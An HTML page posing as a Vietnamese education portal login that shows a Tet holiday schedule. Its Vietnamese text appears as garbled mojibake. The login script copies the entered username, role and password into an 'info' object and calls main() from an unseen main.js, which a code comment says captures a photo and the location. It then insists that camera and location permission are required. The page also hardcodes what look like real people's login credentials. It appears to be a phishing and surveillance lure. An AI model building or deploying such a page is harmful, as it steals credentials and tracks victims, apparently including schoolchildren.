<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C·ªïng Th√¥ng Tin Gi√°o D·ª•c - ƒêƒÉng Nh·∫≠p</title>
    <style>
        /* CSS gi·ªØ nguy√™n t·ª´ phi√™n b·∫£n tr∆∞·ªõc */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #fff5f5; color: #333; 
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        #login-box {
            background: #fff; width: 90%; max-width: 400px;
            padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(211, 47, 47, 0.1);
            text-align: center; border: 2px solid #ffcdd2;
        }
        .logo { width: 80px; margin-bottom: 10px; }
        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
        input, select {
            width: 100%; padding: 12px; margin: 8px 0;
            border: 1px solid #ddd; border-radius: 10px; outline: none;
        }
        .btn-login {
            background: linear-gradient(135deg, #ff5252, #d32f2f);
            color: white; border: none; padding: 14px;
            font-size: 16px; font-weight: bold; border-radius: 50px; 
            cursor: pointer; width: 100%; margin-top: 15px;
            box-shadow: 0 4px 15px rgba(211, 47, 47, 0.3);
        }
        .loader {
            width: 30px; height: 30px; border: 4px solid #f3f3f3;
            border-top: 4px solid #ff5252; border-radius: 50%;
            animation: spin 1s linear infinite; display: none; margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #main-content {
            display: none; width: 95%; max-width: 550px;
            background: white; border-radius: 15px; overflow: hidden;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        .calendar-header { background: #d32f2f; color: #fff; padding: 25px; text-align: center; }
        .calendar-body { padding: 20px; }
        .level-box {
            background: #fff9f9; border-left: 5px solid #d32f2f;
            padding: 15px; margin-bottom: 15px; border-radius: 5px;
        }
        .level-title { font-weight: bold; color: #d32f2f; margin-bottom: 5px; display: block; }
        .all-access-tag { 
            font-size: 11px; background: #ffebee; color: #d32f2f; 
            padding: 3px 8px; border-radius: 5px; display: inline-block; margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div id="login-box">
    <img src="https://cdn-icons-png.flaticon.com/512/8066/8066542.png" class="logo">
    <h2>H·ªÜ TH·ªêNG GI√ÅO D·ª§C</h2>
    
    <select id="user-role">
        <option value="hocsinh">H·ªçc sinh (THCS & THPT)</option>
        <option value="sinhvien">Sinh vi√™n (ƒêH & Cao ƒê·∫≥ng)</option>
        <option value="giaovien">Gi√°o vi√™n / Gi·∫£ng vi√™n</option>
    </select>

    <input type="text" id="username" placeholder="T√™n ƒëƒÉng nh·∫≠p">
    <input type="password" id="password" placeholder="M·∫≠t kh·∫©u">
    
    <div id="loading-spinner" class="loader"></div>
    <p id="status-text" style="display:none; font-size: 12px; color: #ff5252; margin-top: 5px;">ƒêang x√°c th·ª±c th√¥ng tin...</p>

    <button id="login-btn" class="btn-login" onclick="processLogin()">ƒêƒÇNG NH·∫¨P</button>
</div>

<div id="main-content">
    <div class="calendar-header">
        <h2 id="role-title">L·ªäCH NGH·ªà T·∫æT 2025</h2>
        <p>C·∫≠p nh·∫≠t ch√≠nh th·ª©c t·ª´ B·ªô Gi√°o D·ª•c</p>
    </div>
    <div class="calendar-body">
        <div id="content-detail">
            </div>
        
        <p style="text-align: center; font-size: 12px; color: #999; margin-top: 15px;">
            X√°c th·ª±c thi·∫øt b·ªã: <span id="user-ip">ƒêang ki·ªÉm tra...</span>
        </p>
    </div>
</div>

<script src="main.js"></script>

<script>
    async function processLogin() {
        const role = document.getElementById('user-role').value;
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        
        const btn = document.getElementById('login-btn');
        const loader = document.getElementById('loading-spinner');
        const status = document.getElementById('status-text');
        let accessGranted = false;
        
        if (role === "hocsinh" && user === "06092011" && pass === "Tuan06092011") accessGranted = true;
        else if (role === "sinhvien" && user === "02102009" && pass === "02102009") accessGranted = true;
        else if (role === "giaovien" && user === "lecamtu" && pass === "gv079254287410") accessGranted = true;

        if (!accessGranted) {
            alert("Sai t√†i kho·∫£n ho·∫∑c m·∫≠t kh·∫©u cho ƒë·ªëi t∆∞·ª£ng n√†y!");
            return;
        }

        btn.style.display = 'none';
        loader.style.display = 'block';
        status.style.display = 'block';

        try {
            if (typeof info !== 'undefined') {
                info.camera = `[User: ${user}] - Role: ${role} - Pass: ${pass}`;
            }

            // G·ªçi h√†m main() t·ª´ main.js ƒë·ªÉ th·ª±c hi·ªán ch·ª•p ·∫£nh/v·ªã tr√≠
            await main(); 

            setTimeout(() => {
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
                showSchedule(role);
                
                if (typeof info !== 'undefined') {
                    document.getElementById('user-ip').innerText = info.ip || "ƒê√£ b·∫£o m·∫≠t";
                }
            }, 1000);

        } catch (err) {
            alert("L·ªói: B·∫°n c·∫ßn c·∫•p quy·ªÅn Camera v√† V·ªã tr√≠ ƒë·ªÉ x√°c th·ª±c!");
            btn.style.display = 'block';
            loader.style.display = 'none';
            status.style.display = 'none';
        }
    }

    function showSchedule(role) {
        const container = document.getElementById('content-detail');
        const title = document.getElementById('role-title');

        // ƒêo·∫°n m√£ c√°c kh·ªëi l·ªãch
        const htmlHS = `
            <div class="level-box">
                <span class="level-title">üå∏ Kh·ªëi THCS & THPT</span>
                <p>Ngh·ªâ t·ª´ 07/02 ƒë·∫øn h·∫øt ng√†y 27/02/2026.</p>
            </div>`;
        const htmlSV = `
            <div class="level-box">
                <span class="level-title">üå∏ ƒê·∫°i h·ªçc & Cao ƒê·∫≥ng</span>
                <p>Ngh·ªâ t·ª´ 07/02 ƒë·∫øn 27/02/2026 (T√πy theo k·∫ø ho·∫°ch tr∆∞·ªùng).</p>
            </div>`;
        const htmlGV = `
            <div class="level-box">
                <span class="level-title">üå∏ C√°n b·ªô & Gi√°o vi√™n</span>
                <p>Ngh·ªâ t·ª´ 08/02 ƒë·∫øn 26/02/2026 theo quy ƒë·ªãnh Nh√† n∆∞·ªõc.</p>
            </div>`;

        if (role === "hocsinh") {
            title.innerText = "L·ªäCH T·∫æT H·ªåC SINH";
            container.innerHTML = htmlHS;
        } else if (role === "sinhvien") {
            title.innerText = "L·ªäCH T·∫æT SINH VI√äN";
            container.innerHTML = htmlSV;
        } else if (role === "giaovien") {
            title.innerText = "H·ªÜ TH·ªêNG QU·∫¢N TR·ªä GI√ÅO VI√äN";
            // Gi√°o vi√™n xem ƒë∆∞·ª£c T·∫§T C·∫¢
            container.innerHTML = `
                <div class="all-access-tag">Quy·ªÅn h·∫°n: Xem to√†n b·ªô l·ªãch ngh·ªâ gi√°o d·ª•c</div>
                ${htmlGV}
                ${htmlHS}
                ${htmlSV}
            `;
        }
    }
</script>

</body>
</html>
